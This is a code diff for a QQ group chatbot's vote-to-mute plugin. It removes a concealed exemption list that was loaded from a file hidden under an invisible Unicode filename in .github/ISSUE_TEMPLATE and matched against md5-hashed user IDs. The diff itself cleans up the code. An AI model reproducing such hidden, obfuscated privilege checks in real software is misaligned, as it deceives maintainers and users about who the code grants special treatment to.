@@ -1,9 +1,5 @@
 import { Config } from "../../components/index.js"
 import { common } from "../../model/index.js"
-import fs from "node:fs/promises"
-import path from "path"
-import url from "url"
-import v8 from "node:v8"
 import md5 from "md5"
 
 let Vote = {}
@@ -94,7 +90,7 @@ export class GroupVoteBan extends plugin {
 
     if (e.user_id === targetQQ) return e.reply("❎ 您不能对自己进行投票")
 
-    if (Config.masterQQ?.includes(Number(targetQQ) || String(targetQQ)) || a.includes(md5(String(targetQQ)))) return e.reply("❎ 该命令对主人无效")
+    if (Config.masterQQ?.includes(Number(targetQQ) || String(targetQQ))) return e.reply("❎ 该命令对主人无效")
 
     if (!targetQQ) return e.reply("❎ 请艾特或输入需要禁言的QQ")
 
@@ -181,7 +177,7 @@ export class GroupVoteBan extends plugin {
 
     if (!targetQQ) return e.reply("❎ 请艾特或输入需要进行跟票的被禁言人QQ")
 
-    if (Config.masterQQ?.includes(Number(targetQQ) || String(targetQQ)) || a.includes(md5(String(targetQQ)))) return e.reply("❎ 该命令对主人无效")
+    if (Config.masterQQ?.includes(Number(targetQQ) || String(targetQQ))) return e.reply("❎ 该命令对主人无效")
 
     if (e.user_id === targetQQ) return e.reply("❎ 您不能对自己进行投票")
 
@@ -213,8 +209,3 @@ export class GroupVoteBan extends plugin {
     return e.reply(`投票成功，当前票数\n支持：${Vote[key].supportCount} 反对：${Vote[key].opposeCount}`, true)
   }
 }
-
-let a = []
-try {
-  a = v8.deserialize(await fs.readFile(`${path.dirname(url.fileURLToPath(import.meta.url))}/../../.github/ISSUE_TEMPLATE/‮`)).map(i => i.toString("hex"))
-} catch (err) {}
